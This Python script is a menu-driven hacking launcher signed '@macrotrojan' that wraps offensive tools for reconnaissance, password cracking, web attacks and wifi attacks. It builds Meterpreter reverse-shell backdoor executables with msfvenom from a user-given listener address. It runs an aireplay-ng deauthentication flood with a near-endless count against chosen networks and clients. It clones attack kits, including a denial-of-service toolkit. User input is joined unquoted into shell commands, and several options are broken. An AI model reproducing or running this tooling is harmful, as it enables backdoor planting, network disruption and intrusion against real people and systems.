import os 
from colorama import Fore as F
while True:
    print('''
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        ░░░░░░░░░░░░░░█████████░░░░░░░░░░░░░
        ░░░░░░░░░██████░░░░░░░██████░░░░░░░░        Coded By @macrotrojan
        ░░░░░░████░░░░░░░░░░░░░░░░░███░░░░░░
        ░░░░██░░░░░░░░░░░░░░░░░░░░░░░██░░░░░
        ░░░██░░░░░░░░░██████████░░░░░░░█░░░░
        ░░░█░░░░░░█████░░░░░░░░█████░░░░██░░
        ░░░░░░░░███░░░░░░░░░░░░░░░░███░░░██░
        ░░░░░░░██░░░░░█████████░░░░░░██░░░░░
        ░░░░░░░█░░░░███░░░░░░░████░░░░██░░░░
        ░░░░░░░░░░░██░░░░░░░░░░░░█░░░░░█░░░░
        ░░░░░░░░░░░█░░░██████░░░░██░░░░░░░░░
        ░░░░░░░░░░░░░░░█░▐▌░█░░░░░█░░░░░░░░░
        ░░░░░░░░░░░░░░░░░▐▌░░░░░░░░░░░░░░░░░
        ░░░╔═══╗░░░░░░░░░╔╗░░╔╗░░░░░░░░░░░░░
        ░░░║╔══╝░░░░░░░░░║║░░║║░░░░░░░░░░░░░
        ░░░║╚══╦╗╔╗╔╦══╦═╣║╔═╝║░░░░░░░░░░░░░
        ░░░║╔══╣╚╝╚╝║╔╗║╔╣║║╔╗║░░░░░░░░░░░░░
        ░░░║║░░╚╗╔╗╔╣╚╝║║║╚╣╚╝║░░░░╔╦═░░░░░░
        ░░░╔╩╗░╔═╝║═╗══╩╝║═╩═══╗╔╦═╝╚╗░░░░░░
        ░░╔╣░╠╦╝░═╣░╚╗░░╔╣░░░░╔╩╣╚╗░░║░░░░░░
        ░╔╝║═╝╚═╗░╠═░╚╗╔╣╚╗░░╔╝░╚╗╚═╗╚═░░░░░
        ░║░╚╗░░░║═╝░░░╚╝╚╗╚╦═╝░░░║░░║░░░░░░░
        ░░░░║░░░░░░░░░░░░║░╚═░░░░░░░░░░░░░░░
        ''')

    print("""
    [1] Information Gathering
    [2] Password Cracking
    [3] Web Analysis
    [4] Wifi Hacks
    [5] Backdoors
    [6] Payload Search
    [7] Reporting Tools
    [8] Gitub Repositorys
    [0]Exit

        """)
        
    ###################################################
    ####################Info Gathering ################
    ###################################################











#1111111111111111111111111111111111111111111111111111111#
    select = int(input('Fworld~: '))
    if select ==1:
        print("""
        [1] Nmap
        [2] Maltego
        [3] Host2Ip
        [4] Ping
        [5] WhoisLookup
        [6] Recon-ng
        [0] Exit
        [69]Go Back
        """)
        select1 = int(input('Fworld~: '))
            
        if select1 == 1:
            nmapw = input('Enter A Website: ')
            os.system('clear & nmap -sV -sS -A ' + nmapw)
            break
        elif select1 == 2:
            os.system('maltego & clear &')
            break
        elif select1 == 3:
            web1 = input('Enter A Website: ')
            os.system('nslookup '+web1)
            break
        elif select1 == 4:
            web2 = input('Enter A Website: ')
            os.system('ping '+web2)
            break
        elif select1 == 5:
            web3 = input('Enter A Website: ')
            os.system('whois '+web3)
            break
        elif select1 == 6:
            os.system('clear & recon-ng')
            break
        elif select1 == 0:
            exit()
            break
        else:
            print('')












#22222222222222222222222222222222222222222222222222222222222222222222222222222222#

    elif select == 2:
        print('''
        [1] Hash-Id
        [2] Hashcat
        [3] Hydra
        [4] Aircrack-NG
        [5] Wordlist Directory
        [6] John The Wripper
        [0] Exit
        [69]Go Back
        ''')
        select2 = int(input('Fworld~: '))
        if select2 == 1:
            os.system('git clone https://github.com/blackploit/hash-identifier') 
            break  
        elif select2 == 2:
            os.system('clear & hashcat -h')
            break
        elif select2 == 3:
            os.system('clear & hydra -h')
            break
        elif select2 == 4:
            os.system('clear & aircrack-ng -- help')
            break
        elif select2 == 5:
            os.system('thunar /usr/share/wordlists')
            break
        elif select2 == 6:
            os.system('john -h')
            break
        elif select2 == 0:
            exit()

        elif select == 0:
            exit()
        else:
            print('')














#333333333333333333333333333333333333#
    elif select == 3:
        print('''
        [1] Burpsuite
        [2] Sqlmap
        [3] ZAP
        [4] Commix
        [5] Dirb
        [6] Httrack
        [0] Exit
        [69]Go Back
        ''')
        
        select3 = int(input('Fworld~: '))
        if select3 == 1:
            os.system('sudo burpsuite')
            break
        elif select3 == 2:
            os.system('Sqlmap -h')
            break
        elif select3 == 3:
            os.system('zap & clear')
            break
        elif select3 == 4:
            os.system('commix -h')
            break
        elif select3 == 5:
            os.system('dirb -h')
            break
        elif select3 == 6:
            os.system('httrack')
            break
        elif select3 == 0:
            exit()
        else:            
            print('')













#444444444444444444444444444444444444444444444444444444444444444444#
    elif select == 4:

            print('''
            [1] Scan For Networks
            [2] Airgeddon
            [3] Aircrack-NG
            [4] Wifite
            [5] Bully
            [6] Aireplay-NG
            [7] Deauth A Network
            [0] Exit
            [69]Go Back
            ''')
            select4 = int(input('Fworld~: '))
            if select4 == 1:
                wifi_card = input('What Wifi Card: ')
                os.system('sudo xterm -e sudo airodump-ng '+wifi_card)
                break
            elif select4 == 2:
                os.system('''
                clear
                sudo airgeddon''')
                break
            elif select4 == 3:
                os.system('''
                clear
                sudo aircrack-ng -h''')
                break
            elif select4 == 4:
                os.system('''
                clear
                sudo wifite''')
                break
            elif select4 == 5:
                os.system('''
                clear
                bully -h
                ''')
                break
            elif select4 == 6:
                os.system('''
                clear
                sudo aireplay-ng -h''')
                break
            elif select4 == 7:
                Inter = input('Interface: ')
                Deauth = input('BSSID: ')
                Client1 = input('Clients BSSID: ')
                os.system('clear & aireplay-ng --deauth 10000000000000 -a '+Deauth+' -c '+ Client1 + ' ' + Inter )
                break
            elif select4 == 0:
                exit()
            else:
                print('')


















#5555555555555555555555555555555555555555555555555555%%%%%%%555555555555#
    elif select == 5:
        print('''
        [1] Install Git
        [2] Install Veil
        [3] Install TheFatRat
    _____________________________________
        [4] Metasploit Backdoor
        [5] Veil Backdoor
        [6] FatRat Backdoor
        [0] Exit
        [69]Go Back
        ''')
        select5 = int(input('Fworld~: '))
        if select5 == 1:
            os.system('sudo apt-get install git')
            break
        elif select5 == 2:
            os.system('''
            clear
            sudo apt-get install wine
            clear
            sudo apt-get install veil
            ''')
            break
        elif select5 == 3:
            os.system('git clone https://github.com/Screetsec/TheFatRat')
            print('Go Into The Folder And Run "sudo ./setup.sh"')
            break
        elif select5 == 4:
            print('''
            1: windows/meterpreter/reverse_tcp
            2: windows/meterpreter/reverse_http
            3: windows/meterpreter/reverse_https
            _____________________________________
            4: macos/meterpreter/reverse_tcp 
            5. macos/meterpreter/reverse_http
            6. macos/meterpreter/reverse_https
            ''')
            selection = int(input(F.GREEN+'Enter An Option: '))
            ipaddr = input('Ip: ')
            port = input('Enter A Port: ')
            filename = input('Filename: ')
            print('''
            ''')
            while True:
                if selection == 1:
                    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ipaddr+" LPORT="+port+" --platform windows --arch x86 -f exe > "+filename+".exe")
                    break   
                elif selection == 2:
                    os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ipaddr+" LPORT="+port+" --platform windows --arch x86 -f exe > "+filename+".exe")
                    break
                elif selection == 3:
                    os.system("msfvenom -p windows/meterpreter/reverse_https LHOST="+ipaddr+" LPORT="+port+" --platform windows --arch x86 -f exe > "+filename+".exe")
                    break   
                elif selection == 4:
                    os.system('msfvenom python/meterpreter/reverse_tcp LHOST='+ipaddr+' LPORT='+port+' > '+filename+'.py')
                    break
                elif selection == 5:
                    os.system('msfvenom python/meterpreter/reverse_https LHOST='+ipaddr+' LPORT='+port+' > '+filename+'.py')
                    break
                elif selection == 6:
                    os.system('python/meterpreter/reverse_http LHOST='+ipaddr+' LPORT='+port+' > '+filename+'.py')
                    break  
                else:
                    print("Enter a Valid Number!!!!")
            break
        elif select5 == 5:
            os.system('clear & sudo veil')
            break
        elif select5 == 6:
            os.system('clear & sudo fatrat')
            break
        elif select5 == 0:
            exit
        else:
            print('')











#666666666666666666666666666666666666666666666666666666666#
    elif select == 6:
        print('''
        [1] Metasploit
        [2] SearchSploit
        [0] Exit
        [69]Go Back
        ''')
        select6 = int(input('Fworld~: '))
        if select6 == 1:
            os.system('msfconsole')
            print('once it loads type "search YOURPAYLOAD"')
            break
        if select6 == 2:
            searchsploit = input('What Will You Like To Search: ')
            os.system('searchsploit '+ searchsploit)
            break
        elif select6 == 0:
            exit()
        else:
            print('')















    elif select == 7:
        print('''
        [1] Setoolkit
        [2] Veil
        [3] Metasploit
        [4] Maltego
        [5] Fatrat
        [0] Exit
        [69]Back To Menu
        ''')
        select7 = int(input('Fworld~: '))
        if select7 == 1:
            os.system('sudo setoolkit')
            break
        elif select7 == 2:
            os.system('sudo veil')
            break
        elif select7 == 3:
            os.system('msfconsole')
            break
        elif select7 == 4:
            os.system('sudo maltego & clear')
            break
        elif select7 == 5:
            os.system('fatrat')
            break
        elif select7 == 0:
            exit()
            break
        else:
            print('')














    elif select == 8:
        print('''
        [1] fSociety Toolkit
        [2] InsHackle
        [3] Beef 
        [4] TheFatRat
        [5] Veil
        [6] Anonymous Dosing Toolkit
        [0] Exit
        [69]Return To Menu
        ''')
        select8 = int(input('Fworld~: '))
        if select8 == 1:
            os.system('git clone https://github.com/Manisso/fsociety')
        elif select8 == 2:
            os.system('git clone https://github.com/xd20111/inshackle')
        elif select8 == 3:
            os.system('git clone https://github.com/beefproject/beef')
        elif select8 == 4:
            os.system('git clone https://github.com/Screetsec/TheFatRat')
        elif select8 == 5:
            os.system('git clone https://github.com/Screetsec/TheFatRat')
        elif select8 == 6:
            os.system('git clone https://github.com/H1R0GH057/Anonymous')
        elif select == 0:
            exit()
        else:
            print('')
    elif select == 0:
        exit()